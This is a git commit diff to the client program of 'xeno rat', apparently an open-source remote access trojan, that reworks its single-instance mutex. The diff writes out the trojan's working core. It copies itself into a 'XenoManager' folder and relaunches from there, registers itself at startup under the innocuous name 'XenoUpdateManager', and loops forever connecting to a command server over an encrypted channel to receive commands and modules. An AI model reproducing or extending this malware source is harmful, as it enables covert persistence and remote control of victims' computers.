9169c0cee57fcfef0ba2b06dd1975da70ccbcef2
thechosenskywalker <160448998+thechosenskywalker@users.noreply.github.com>
2024-02-20 19:30:01 -0500

    Mutex Update
    Original mutex is broken. Fixed the mutex, works good now from disk and from memory. Mutex text from builder no longer necessary.

--- xeno rat client/Program.cs
+++ xeno rat client/Program.cs
@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -9,10 +9,14 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Runtime.InteropServices;   //GuidAttribute
+using System.Security.AccessControl;    //MutexAccessRule
+using System.Security.Principal;        //SecurityIdentifier
 
 namespace xeno_rat_client
 {
-    class Program
+
+    public class Program
     {
         private static Node Server;
         private static DllHandler dllhandler = new DllHandler();
@@ -27,80 +31,132 @@ namespace xeno_rat_client
 
         public static StringBuilder ProcessLog = new StringBuilder();
 
-        static async Task Main(string[] args)
+        static async Task Main()
         {
-            CapturingConsoleWriter ConsoleCapture = new CapturingConsoleWriter(Console.Out);
 
-            Console.SetOut(ConsoleCapture);
+            // get application GUID as defined in AssemblyInfo.cs
+            string appGuid =
+                ((GuidAttribute)Assembly.GetExecutingAssembly().
+                    GetCustomAttributes(typeof(GuidAttribute), false).
+                        GetValue(0)).Value.ToString();
 
-            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
-            bool createdNew;
-            if (Utils.IsAdmin()) 
+            // unique id for global mutex - Global prefix means it is global to the machine
+            string mutexId = string.Format("Global\\{{{0}}}", appGuid);
+
+            // Need a place to store a return value in Mutex() constructor call
+            bool createdNew2;
+
+            // edited by Jeremy Wiebe to add example of setting up security for multi-user usage
+            // edited by 'Marc' to work also on localized systems (don't use just "Everyone") 
+            var allowEveryoneRule =
+                new MutexAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid
+                                                           , null)
+                                   , MutexRights.FullControl
+                                   , AccessControlType.Allow
+                                   );
+            var securitySettings = new MutexSecurity();
+            securitySettings.AddAccessRule(allowEveryoneRule);
+
+            // edited by MasonGZhwiti to prevent race condition on security settings via VanNguyen
+            using (var mutex2 = new Mutex(false, mutexId, out createdNew2, securitySettings))
             {
-                mutex_string = mutex_string + "-admin";
-            }
-            if (Install_path != "nothingset") 
-            {
+                // edited by acidzombie24
+                var hasHandle = false;
                 try
                 {
-
-                    string dir = Environment.ExpandEnvironmentVariables($"%{Install_path}%\\XenoManager\\");
-                    if (System.IO.Directory.GetCurrentDirectory() != dir) 
+                    try
                     {
-                        string self = Assembly.GetEntryAssembly().Location;
-                        if (!Directory.Exists(dir))
-                        {
-                            Directory.CreateDirectory(dir);
-                        }
-                        File.Copy(self, dir + Path.GetFileName(self));
-                        Process.Start(dir + Path.GetFileName(self));
-                        Environment.Exit(0);
+                        // note, you may want to time out here instead of waiting forever
+                        // edited by acidzombie24
+                        // mutex.WaitOne(Timeout.Infinite, false);
+                        hasHandle = mutex2.WaitOne(1, false);
+                        if (hasHandle == false)
+                            throw new TimeoutException("Timeout waiting for exclusive access");
+                    }
+                    catch (AbandonedMutexException)
+                    {
+                        // Log the fact that the mutex was abandoned in another process,
+                        // it will still get acquired
+                        hasHandle = true;
                     }
 
+                    // Perform your work here.
+                    CapturingConsoleWriter ConsoleCapture = new CapturingConsoleWriter(Console.Out);
+
+                    Console.SetOut(ConsoleCapture);
+
+                    AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
+
+                    if (Install_path != "nothingset")
+                    {
+                        try
+                        {
+
+                            string dir = Environment.ExpandEnvironmentVariables($"%{Install_path}%\\XenoManager\\");
+                            if (System.IO.Directory.GetCurrentDirectory() != dir)
+                            {
+                                string self = Assembly.GetEntryAssembly().Location;
+                                if (!Directory.Exists(dir))
+                                {
+                                    Directory.CreateDirectory(dir);
+                                }
+                                File.Copy(self, dir + Path.GetFileName(self));
+                                Process.Start(dir + Path.GetFileName(self));
+                                Environment.Exit(0);
+                            }
+
+                        }
+                        catch
+                        {
+
+                        }
+                    }
+
+                    await Task.Delay(delay);
+                    if (DoStartup == 1)
+                    {
+                        if (startup_name == "nothingset")
+                        {
+                            startup_name = "XenoUpdateManager";
+                        }
+                        if (Utils.IsAdmin())
+                        {
+                            await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                        }
+                        else
+                        {
+                            await Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                        }
+
+                    }
+                    while (true)
+                    {
+                        try
+                        {
+                            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                            await socket.ConnectAsync(ServerIp, ServerPort);
+                            Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
+                            Handler handle = new Handler(Server, dllhandler);
+                            await handle.Type0Receive();
+                        }
+                        catch (Exception e)
+                        {
+                            await Task.Delay(10000);
+                            Console.WriteLine(e.Message);
+                        }
+                    }
+
+                    //end work here
                 }
-                catch 
-                { 
-                    
+                finally
+                {
+                    // edited by acidzombie24, added if statement
+                    if (hasHandle)
+                        mutex2.ReleaseMutex();
                 }
             }
-            Mutex mutex = new Mutex(true, mutex_string, out createdNew);
-            if (!createdNew)
-            {
-                return;
-            }
-            await Task.Delay(delay);
-            if (DoStartup == 1)
-            {
-                if (startup_name == "nothingset")
-                {
-                    startup_name = "XenoUpdateManager";
-                }
-                if (Utils.IsAdmin())
-                {
-                    await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
-                }
-                else 
-                {
-                    await Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
-                }
-                
-            }
-            while (true)
-            {
-                try
-                {
-                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    await socket.ConnectAsync(ServerIp, ServerPort);
-                    Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
-                    Handler handle = new Handler(Server, dllhandler);
-                    await handle.Type0Receive();
-                }
-                catch (Exception e)
-                {
-                    await Task.Delay(10000);
-                    Console.WriteLine(e.Message);
-                }
-            }
+
+           
         }
 
         public static void OnDisconnect(Node MainNode) 
